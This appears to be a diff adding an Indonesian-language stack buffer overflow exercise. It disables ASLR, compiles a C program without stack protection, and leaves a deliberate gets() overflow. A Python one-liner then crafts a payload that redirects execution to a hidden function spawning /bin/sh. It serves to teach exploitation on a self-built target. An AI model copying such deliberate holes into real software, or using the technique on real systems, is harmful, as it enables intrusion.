@@ -1,0 +1,33 @@
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space   # Disable ASLR
+gcc -fno-stack-protector -z execstack vuln.c -o vuln     # Compile tanpa proteksi
+
+
+#include <stdio.h>
+#include <string.h>
+
+void secret() {
+    printf("📢 Anda berhasil mengakses fungsi rahasia!\n");
+    system("/bin/sh");  // spawn shell
+}
+
+void vulnerable() {
+    char buffer[64];
+    printf("Masukkan input Anda: ");
+    gets(buffer);  // fungsi berbahaya: tidak ada batasan panjang input
+}
+
+int main() {
+    vulnerable();
+    printf("Selesai.\n");
+    return 0;
+}
+
+
+
+objdump -d ./vuln | grep secret
+
+
+python3 -c "print('A'*64 + 'BBBB' + '\xe2\x91\x04\x08')" > input.txt
+./vuln < input.txt
+
+
